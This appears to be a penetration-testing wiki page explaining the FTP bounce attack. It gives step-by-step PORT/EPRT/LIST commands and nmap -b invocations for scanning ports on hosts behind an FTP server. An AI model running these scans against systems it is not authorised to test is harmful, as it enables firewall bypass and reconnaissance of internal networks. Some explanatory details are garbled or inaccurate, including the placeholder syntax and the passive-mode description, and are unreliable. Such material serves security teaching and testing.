# FTP Bounce attack - Scan

An FTP Bounce Attack is a type of vulnerability that targets the File Transfer Protocol (FTP) server. FTP, which is used to transfer files over the internet and intranet, operates in two modes: active and passive. An FTP Bounce Attack takes advantage of a misconfiguration or weakness in how the FTP server handles the data connection, allowing an attacker to use the FTP server as a proxy to send data to arbitrary ports on the network, bypassing firewalls and other security measures.

In essence, this attack allows a malicious user to exploit the FTP server to communicate with systems on internal or protected networks, even if those systems would otherwise be inaccessible due to network configurations.

# How Does an FTP Bounce Attack Work?

**FTP Active Mode:** In FTP active mode, when a client connects to an FTP server to download or upload files, the server opens a data connection to the client. The data connection uses a random port on the client side to establish communication.

**FTP Passive Mode:** In passive mode, the server opens a data connection to the client, listening on a random port, which the client connects to. This mode is often used when the client is behind a firewall or NAT device.

**The Attack Scenario:** An attacker who can connect to the FTP server in active mode can manipulate the FTP command to connect to arbitrary addresses. In particular, the attacker will send a command (such as PORT) that allows the FTP server to establish a data connection to an arbitrary IP address and port.

In this case, the FTP server is used as a proxy. Instead of transferring files, the attacker can direct the FTP server to connect to any network address, including machines on an internal network that would normally be protected by firewalls.

# Exploitation Steps of an FTP Bounce Attack

Step 1: Connecting to the FTP Server<br>
The attacker connects to the FTP server using an FTP client.<br>

Step 2: Sending FTP Commands<br>
The attacker sends the PORT command, which is used to specify the IP address and port that the FTP server should connect to for data transfer. This command can be used in a way that directs the FTP server to connect to a different system (either within the same network or another accessible network).<br>

Step 3: Exploiting FTP Misconfiguration<br>
If the FTP server does not properly filter or validate the PORT command input, the attacker can trick the server into establishing connections to other machines or services that are not normally accessible (e.g., internal servers or machines behind a firewall).<br>

Step 4: Bypassing Firewall or Network Restrictions<br>
By using the FTP server as a proxy, the attacker can bypass firewall rules or network restrictions that would normally block direct connections to other systems or ports. This opens the door for a variety of malicious activities, such as network scanning, exploiting vulnerable services, or even launching further attacks.<br>

Step 5: Performing the Attack<br>
Once the server connects to the target system, the attacker may be able to gather information, upload malicious payloads, or exploit any vulnerabilities on the internal system.r<br>

# Example Command Flow of FTP Bounce Attack:
```Step 1: Attacker connects to an FTP server:<br>
ftp ftp.server.com<br>
Step 2: FTP server prompts for credentials. Attacker logs in.<br>
Step 3: Attacker issues the PORT command:<br>
PORT <attacker></attacker> <IP>,<port><br>
This tells the FTP server to initiate a connection to the specified IP address and port (which could be internal).<br>
Step 4 The FTP server establishes the connection to the attacker-specified IP address and port, possibly bypassing firewalls or other security measures.<br>

Example:
Connect: ftp ftp.targetserver.com
Login: Enter credentials if required or use anonymous login.
Use PORT Command: PORT 192,168,1,10,4,1 (Example IP and port)
Transfer Command: RETR file.txt (Request to retrieve a file, using the PORT command parameters to specify the target)
Analyze: The attacker receives the file/data from the target system via the FTP server.

```
## FTP Bounce - Scanning

### Manual

1. Connect to vulnerable FTP
2.  Use \*\*`PORT`\*\*or **`EPRT`**(but only 1 of them) to make it establish a connection with the _\<IP:Port>_ you want to scan:

    `PORT 172,32,80,80,0,8080`\
    `EPRT |2|172.32.80.80|8080|`
3. Use **`LIST`**(this will just send to the connected _\<IP:Port>_ the list of current files in the FTP folder) and check for the possible responses: `150 File status okay` (This means the port is open) or `425 No connection established` (This means the port is closed)
   1. Instead of `LIST` you could also use **`RETR /file/in/ftp`** and look for similar `Open/Close` responses.

Example Using **PORT** (port 8080 of 172.32.80.80 is open and port 7777 is closed):
![](<../../.gitbook/assets/image (241).png>)
Same example using **`EPRT`**(authentication omitted in the image):
![](<../../.gitbook/assets/image (539).png>)
Open port using `EPRT` instead of `LIST` (different env)
![](<../../.gitbook/assets/image (875).png>)

### **nmap**

```bash
nmap -b <name>:<pass>@<ftp_server> <victim>
nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTP
nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80,443
```
